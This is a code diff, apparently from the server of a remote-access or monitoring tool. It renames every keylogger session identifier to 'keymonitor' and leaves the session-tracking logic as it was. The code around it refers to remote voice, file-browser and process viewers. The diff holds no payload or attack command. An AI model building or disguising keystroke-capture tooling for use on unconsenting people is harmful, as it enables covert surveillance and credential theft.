@@ -6,7 +6,7 @@ import type {
   ProcessViewer,
   VoiceViewer,
   NotificationsViewer,
-  KeyloggerViewer,
+  KeymonitorViewer,
   SocketData,
 } from "./types";
 
@@ -31,8 +31,8 @@ const processSessions = new Map<string, ProcessViewer>();
 const fileBrowserSessionsByClient = new Map<string, Set<string>>();
 const processSessionsByClient = new Map<string, Set<string>>();
 const notificationSessions = new Map<string, NotificationsViewer>();
-const keyloggerSessions = new Map<string, KeyloggerViewer>();
-const keyloggerSessionsByClient = new Map<string, Set<string>>();
+const keymonitorSessions = new Map<string, KeymonitorViewer>();
+const keymonitorSessionsByClient = new Map<string, Set<string>>();
 const voiceSessions = new Map<string, VoiceViewer>();
 const voiceSessionsByClient = new Map<string, Set<string>>();
 const dashboardSessions = new Map<string, DashboardViewer>();
@@ -370,40 +370,40 @@ export function safeSendViewerFrame(
   }
 }
 
-export function addKeyloggerSession(session: KeyloggerViewer): void {
-  keyloggerSessions.set(session.id, session);
-  addSessionToClientIndex(keyloggerSessionsByClient, session.clientId, session.id);
+export function addKeymonitorSession(session: KeymonitorViewer): void {
+  keymonitorSessions.set(session.id, session);
+  addSessionToClientIndex(keymonitorSessionsByClient, session.clientId, session.id);
 }
 
-export function getKeyloggerSession(
+export function getKeymonitorSession(
   sessionId: string,
-): KeyloggerViewer | undefined {
-  return keyloggerSessions.get(sessionId);
+): KeymonitorViewer | undefined {
+  return keymonitorSessions.get(sessionId);
 }
 
-export function deleteKeyloggerSession(sessionId: string): boolean {
-  const existing = keyloggerSessions.get(sessionId);
+export function deleteKeymonitorSession(sessionId: string): boolean {
+  const existing = keymonitorSessions.get(sessionId);
   if (!existing) return false;
-  keyloggerSessions.delete(sessionId);
-  removeSessionFromClientIndex(keyloggerSessionsByClient, existing.clientId, sessionId);
+  keymonitorSessions.delete(sessionId);
+  removeSessionFromClientIndex(keymonitorSessionsByClient, existing.clientId, sessionId);
   return true;
 }
 
-export function getKeyloggerSessionsByClient(
+export function getKeymonitorSessionsByClient(
   clientId: string,
-): KeyloggerViewer[] {
-  const ids = keyloggerSessionsByClient.get(clientId);
+): KeymonitorViewer[] {
+  const ids = keymonitorSessionsByClient.get(clientId);
   if (!ids || ids.size === 0) return [];
-  const sessions: KeyloggerViewer[] = [];
+  const sessions: KeymonitorViewer[] = [];
   for (const id of ids) {
-    const session = keyloggerSessions.get(id);
+    const session = keymonitorSessions.get(id);
     if (session) sessions.push(session);
   }
   return sessions;
 }
 
-export function getAllKeyloggerSessions(): Map<string, KeyloggerViewer> {
-  return keyloggerSessions;
+export function getAllKeymonitorSessions(): Map<string, KeymonitorViewer> {
+  return keymonitorSessions;
 }
 
 export function addVoiceSession(session: VoiceViewer): void {
